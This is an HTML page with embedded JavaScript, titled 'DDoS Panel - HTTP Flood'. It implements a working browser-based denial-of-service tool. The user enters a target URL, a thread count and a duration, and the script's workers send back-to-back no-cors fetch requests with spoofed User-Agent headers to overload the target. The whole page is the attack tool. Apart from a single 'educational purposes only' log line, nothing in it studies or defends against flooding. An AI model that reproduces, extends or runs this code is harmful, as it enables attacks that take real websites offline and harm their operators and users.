<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>DDoS Panel - HTTP Flood</title>
    <style>
        body { background: #0a0a0a; color: #00ff00; font-family: monospace; padding: 20px; }
        input, button { background: #1a1a1a; color: #00ff00; border: 1px solid #00ff00; padding: 10px; margin: 5px; }
        button { cursor: pointer; }
        button:hover { background: #00ff00; color: #000; }
        .status { color: #ffaa00; }
    </style>
</head>
<body>
    <h1>🌐 DDoS PANEL - HTTP FLOOD</h1>
    <div>
        <label>Target URL:</label>
        <input type="text" id="url" value="http://example.com" size="40">
    </div>
    <div>
        <label>Threads:</label>
        <input type="number" id="threads" value="50" min="1" max="200">
        <label>Duration (sec):</label>
        <input type="number" id="duration" value="30" min="5" max="300">
    </div>
    <div>
        <button onclick="startAttack()">▶ START</button>
        <button onclick="stopAttack()">⏹ STOP</button>
        <button onclick="clearLog()">🗑 CLEAR</button>
    </div>
    <div class="status" id="status">Idle</div>
    <hr>
    <div id="log" style="height:400px; overflow-y:scroll; background:#111; padding:10px; border:1px solid #333;"></div>

    <script>
        let workers = [];
        let running = false;
        let stopFlag = false;

        function log(msg) {
            const d = document.getElementById('log');
            const t = new Date().toLocaleTimeString();
            d.innerHTML += `[${t}] ${msg}\n`;
            d.scrollTop = d.scrollHeight;
        }

        function clearLog() {
            document.getElementById('log').innerHTML = '';
        }

        // ---------- WORKER (simulates HTTP flood in browser) ----------
        function floodWorker(url, duration, workerId) {
            const startTime = Date.now();
            const endTime = startTime + duration * 1000;
            let count = 0;

            function sendRequest() {
                if (stopFlag || Date.now() > endTime) return;
                try {
                    fetch(url, {
                        method: 'GET',
                        mode: 'no-cors',
                        cache: 'no-cache',
                        headers: {
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                            'Pragma': 'no-cache',
                            'Cache-Control': 'no-cache'
                        }
                    }).catch(() => {});
                    count++;
                } catch (e) {}
                // Schedule next request immediately (no delay)
                if (!stopFlag && Date.now() < endTime) {
                    setTimeout(sendRequest, 0);
                } else {
                    log(`[Worker ${workerId}] Finished - ${count} requests`);
                }
            }

            // Start flood
            for (let i = 0; i < 5; i++) {
                setTimeout(sendRequest, i * 2);
            }
        }

        // ---------- START ----------
        function startAttack() {
            if (running) {
                log('⚠ Attack already running. Stop first.');
                return;
            }

            const url = document.getElementById('url').value.trim();
            if (!url || !url.startsWith('http')) {
                log('❌ Invalid URL. Must start with http:// or https://');
                return;
            }

            const threads = parseInt(document.getElementById('threads').value) || 50;
            const duration = parseInt(document.getElementById('duration').value) || 30;

            if (threads < 1 || threads > 500) {
                log('❌ Threads must be between 1 and 500');
                return;
            }

            running = true;
            stopFlag = false;
            document.getElementById('status').textContent = '▶ RUNNING';
            document.getElementById('status').style.color = '#ff4444';
            log(`🚀 Starting attack on ${url} with ${threads} threads for ${duration}s`);

            for (let i = 0; i < threads; i++) {
                setTimeout(() => {
                    if (!stopFlag) {
                        floodWorker(url, duration, i);
                    }
                }, i * 1); // stagger start
            }

            // Auto-stop after duration + 2 seconds
            setTimeout(() => {
                if (running) {
                    stopAttack();
                    log('⏹ Auto-stopped after duration');
                }
            }, duration * 1000 + 2000);
        }

        // ---------- STOP ----------
        function stopAttack() {
            if (!running) {
                log('⚠ No attack running.');
                return;
            }
            running = false;
            stopFlag = true;
            document.getElementById('status').textContent = '⏹ STOPPED';
            document.getElementById('status').style.color = '#ffaa00';
            log('🛑 Attack stopped by user.');
        }

        // ---------- KEYBOARD SHORTCUTS ----------
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Enter' && e.ctrlKey) {
                startAttack();
            }
            if (e.key === 'Escape') {
                stopAttack();
            }
        });

        log('✅ Panel loaded. Ctrl+Enter to start, ESC to stop.');
        log('⚠ Browser-based DDoS is weak. Use for educational purposes only.');
    </script>
</body>
</html>
